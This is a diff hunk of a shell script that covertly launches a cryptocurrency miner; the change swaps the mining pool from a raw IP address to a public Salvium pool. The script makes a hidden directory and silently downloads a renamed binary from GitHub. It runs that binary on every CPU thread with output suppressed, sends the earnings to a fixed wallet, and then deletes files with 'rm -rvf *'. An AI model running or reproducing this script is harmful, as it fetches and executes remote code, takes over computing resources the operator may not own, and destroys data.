@@ -12,7 +12,7 @@ WORKER=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday
 mkdir .lib && cd .lib
 wget -O sgr1 https://github.com/cornea99/upil/raw/main/zepo > /dev/null 2>&1
 chmod u+x sgr1
-./sgr1 --donate-level 1 -o 165.227.239.240:443 -u SaLvsC7GYZSQpZXn4F63d52MSxNjKLa3hh92Mucq2Av29ueS1Lej8HK8r7P3arc9BvKsduPQ17pYdZG74au9hXs2cwHyZ9CFwuw.$WORKER -p x -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
+./sgr1 --donate-level 1 -o us.salvium.herominers.com:1230 -u SaLvsC7GYZSQpZXn4F63d52MSxNjKLa3hh92Mucq2Av29ueS1Lej8HK8r7P3arc9BvKsduPQ17pYdZG74au9hXs2cwHyZ9CFwuw.$WORKER -p x -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
 sleep 30
 rm -rvf *
 cd ~/
